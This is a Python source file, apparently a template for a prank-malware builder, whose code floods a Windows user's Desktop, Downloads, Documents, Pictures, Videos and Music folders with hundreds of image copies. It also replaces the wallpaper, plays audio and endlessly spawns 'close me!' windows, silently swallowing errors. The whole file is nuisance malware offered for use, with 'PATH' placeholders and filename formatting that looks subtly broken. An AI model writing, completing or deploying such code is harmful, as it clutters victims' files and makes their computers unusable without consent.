#its not what the builder gonna make changes in btw
import threading
import os
import shutil
import ctypes
import sys
from customtkinter import *
from PIL import Image
import pygame
global times

def get_resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    
    return os.path.join(base_path, relative_path)

def create_files():
    global times
    times = 500
    dirr = ["Desktop", "Downloads", "Documents", "Pictures", "Videos", "Music"]
    user_path = os.path.expanduser("~")
    
    def desk():
        for i, dr in enumerate(dirr, start=1):
            target_dir = os.path.join(user_path, dr)
            if not os.path.exists(target_dir):
                os.makedirs(target_dir)

            for j in range(times): 
                try:
                    image="PATH"
                    destination_file = os.path.join(target_dir, f"{{j+1}}{{image}}")
                    shutil.copy(get_resource_path(f"{{image}}"), destination_file)
                except Exception as e:
                    pass
    desk1 = threading.Thread(target=desk)
    desk1.start()

def change_wallpaper():
    image_filename = "PATH"
    try:
        full_image_path = get_resource_path(image_filename)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, full_image_path, 3)
    except Exception as e:
        pass

def playsound_():
    AUDIO="PATH"
    pygame.mixer.init()  
    audio_file = get_resource_path(AUDIO)
    pygame.mixer.music.load(audio_file)  
    pygame.mixer.music.play()  
    while pygame.mixer.music.get_busy():  
        pygame.time.Clock().tick(10)

def windows_():
        times=150
        window_image="PATH"
        image_filename = window_image
        while True:
            try:
                main_window= CTk()
                main_window.state('withdraw')
                main_window.title("close me!")
                main_window.geometry("3x3+400+500")
                imag_path=get_resource_path(image_filename)
                ig=Image.open(imag_path)
                ctk_img=CTkImage(light_image=ig,size=(469,455))
                for i in range(times):

                    window=CTkToplevel(main_window)
                    window.geometry("469x455")
                    label =CTkLabel(window,text=' ',image=ctk_img)
                    label.pack(pady=20)
                main_window.mainloop()
            except Exception:
                pass
file_ = threading.Thread(target=create_files)
file_.start()

wallpaper_ = threading.Thread(target=change_wallpaper)
wallpaper_.start()

windows_1=threading.Thread(target=windows_)
windows_1.start()

sound__ = threading.Thread(target=playsound_)
sound__.start()
